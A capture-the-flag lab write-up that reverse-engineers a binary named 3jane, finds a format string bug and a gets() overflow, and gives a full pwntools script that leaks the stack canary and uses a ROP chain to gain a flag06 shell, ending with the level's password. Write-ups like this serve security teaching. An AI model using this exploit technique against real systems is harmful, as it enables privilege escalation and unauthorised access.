Checking the binary protections:

```sh
level06@rainfall:~$ checksec 3jane
[*] '/home/level06/3jane'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

Since no source code was provided, we reversed the assembly to reconstruct the application's behavior. We can omit the complex `init_vault` setup as it merely initializes structures that are not relevant to the vulnerability.

Disassembly reveals a format string vulnerability in `log_request`:

```c
void log_request() {
    char buff[64];
    
    printf("[3JANE] Request ID: ");
    fflush(stdout);
    fgets(buff, sizeof(buff), stdin);
    buff[strcspn(buff, "\n")] = '\0';
    printf("[3JANE] Logging: ");
    printf(buff); // Format string vulnerability
    putchar('\n');
    access_log_idx++;
}

```

The stack frame layout positions the stack canary right before the saved `RBP`:

```text
[saved RIP]
[saved RBP]
[canary]
...
[RSP]

```

Inspecting the disassembly of `log_request`:

```assembly
(gdb) disass log_request
Dump of assembler code for function log_request:
   0x0000000000401418 <+0>:     endbr64
   0x000000000040141c <+4>:     push   %rbp
   0x000000000040141d <+5>:     mov    %rsp,%rbp
   0x0000000000401420 <+8>:     sub    $0x50,%rsp
   ...

```

The function allocates `0x50` bytes on the stack. The canary sits at `RBP - 0x8` (`0x50 - 0x8 = 0x48` bytes from `RSP`). In the x86-64 calling convention, the first 6 arguments are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`) before reading from the stack. The format string positional offset is calculated as:

$$\text{Canary Offset} = \frac{0x50 - 8}{8} + 6 = \frac{72}{8} + 6 = 9 + 6 = 15$$

Passing `%15$p` leaks the active canary value.

Next, analyzing the `authenticate` function reveals an unbounded `gets()` call:

```c
void authenticate() {
    char buff[128]; // sub $0x90, %rsp -> offset to canary is 0x90 - 8 = 0x88 (136 bytes)
    
    printf("[3JANE] Access code: ");
    fflush(stdout);
    gets(buff); // Buffer overflow vulnerability

    if (strncmp(buff, "STRAYLIGHT_", 11) == 0) {
        printf("[3JANE] Access granted. Clearance level: %u\n", vault.level);
    } else {
        puts("[3JANE] Access denied.");
    }
}

```

The stack allocation of `0x90` means the canary sits at offset `0x88` (136 bytes). To hijack control flow without triggering `__stack_chk_fail`, our payload structure is:

```text
[136 bytes padding] + [leaked canary] + [8 bytes fake RBP] + [ROP chain]

```

Our ROP chain executes `setreuid(1023, 1023)` to assume the privileges of `flag06` (`UID: 1023`), followed by `system("/bin/sh")` and `exit(3)`.

**`exploit.py`:**

```python
from pwn import *
import sys

libc = 0x7ffff7c00000

# ROP Gadgets
ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x000000000002882f)  # ret (16-byte stack alignment)

# Functions & Strings
ROP_SH       = p64(libc + 0x00000000001cb42f)
ROP_SYS      = p64(libc + 0x0000000000058750)
ROP_SETREUID = p64(libc + 0x00000000001271d0)
ROP_EXIT     = p64(libc + 0x0000000000047ba0)

OWNER_UID    = p64(1023)

p = process('/home/level06/3jane', env={})

# Step 1: Leak Stack Canary via Format String
p.recvuntil(b"[3JANE] Request ID: ")
p.sendline(b'%15$p')
size = len(b"[3JANE] Logging: ")
canary_string = p.recvline().strip()[size:]
canary = int(canary_string, 16)

# Step 2: Build ROP Chain
rop_chain  = ROP_RDI + OWNER_UID
rop_chain += ROP_RSI + OWNER_UID
rop_chain += ROP_SETREUID
rop_chain += ROP_RDI
rop_chain += ROP_SH
rop_chain += ROP_SYS
rop_chain += ROP_RDI
rop_chain += p64(3)
rop_chain += ROP_EXIT

# Step 3: Send Payload to authenticate()
p.recvuntil(b"[3JANE] Access code: ")
payload = b'A' * 136 + p64(canary) + p64(0) + rop_chain

p.sendline(payload)
p.interactive()

```

**Execution & Flag Capture:**

```sh
level06@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level06/3jane': pid 1910
[*] Switching to interactive mode
[3JANE] Access denied.
$ whoami
flag06
$ cat /home/flag06/.pass
c1t0kg9pklac7x4c7sn7iqgfppkz4usq

```